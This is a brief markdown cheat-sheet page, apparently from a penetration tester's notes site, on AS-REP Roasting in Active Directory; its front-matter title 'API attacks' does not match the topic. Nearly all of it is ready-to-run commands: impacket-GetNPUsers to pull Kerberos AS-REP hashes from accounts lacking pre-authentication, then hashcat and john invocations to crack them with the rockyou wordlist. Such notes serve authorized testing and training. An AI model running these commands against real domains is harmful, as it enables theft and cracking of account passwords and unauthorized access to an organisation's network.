---
layout: default
title: API attacks
permalink: /AD/AS-REP_Roasting/
---

# AS-REP Roasting

Request TGT ticket and dump the hash if Kerberos pre-authentication is disabled
```
impacket-GetNPUsers $domain/$service_account -dc-ip $ip -no-pass
```
crack it:
```
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force
```
or:
```
john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
```
